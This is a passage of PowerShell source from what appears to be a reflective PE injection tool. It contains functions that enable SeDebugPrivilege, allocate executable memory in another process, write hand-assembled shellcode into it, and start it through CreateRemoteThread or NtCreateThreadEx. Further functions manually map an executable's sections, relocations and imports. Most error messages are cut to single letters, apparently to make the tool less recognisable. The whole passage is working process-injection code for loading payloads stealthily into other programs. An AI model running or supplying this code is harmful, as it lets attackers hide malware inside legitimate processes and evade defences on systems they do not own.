				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "U"
				}

				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "U"
				}
			}
			else
			{
				Throw "U"
			}
		}

		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{

		}

		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}


	Function Invoke-CreateRemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,

		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,

		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,

		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)

		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero

		$OSVersion = [Environment]::OSVersion.Version

		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "E"
			}
		}

		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}

		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Verbose "E"
		}

		return $RemoteThreadHandle
	}



	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		$NtHeadersInfo = New-Object System.Object


		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)


		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)


	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "I"
	    }

		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}

		return $NtHeadersInfo
	}



	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		$PEInfo = New-Object System.Object


		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null


		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types


		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)


		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)

		return $PEInfo
	}



	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'P'
		}

		$PEInfo = New-Object System.Object


		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types


		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)

		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}

		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "P"
		}

		return $PEInfo
	}


	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,

		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "U"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)

		if ($Success -eq $false)
		{
			Throw "U"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "D"
		}

		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes

		[IntPtr]$DllAddress = [IntPtr]::Zero
		if ($PEInfo.PE64Bit -eq $true)
		{

			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "U"
			}

			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)

			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem

			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)


			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "U"
			}

			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}

			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "C"
			}


			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "C"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "C"
			}

			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "C"
			}

			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}

		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

		return $DllAddress
	}


	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,

		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,

		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)


		$FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RFuncNamePtr -eq [IntPtr]::Zero)
		{
			Throw "U"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
		if ($Success -eq $false)
		{
			Throw "U"
		}
		if ($FunctionNameSize -ne $NumBytesWritten)
		{
			Throw "D"
		}


		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes


		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "U"
		}


		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem

		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)

		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "U"
		}

		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "U"
		}

		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "C"
		}

		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "C"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)


			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))

			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}

			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}

			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}


			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)

		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}

		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{

			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			for($i = 0; $i -lt $NumRelocations; $i++)
			{

				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}


				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])

					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}

			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)

		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}

		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

			while ($true)
			{
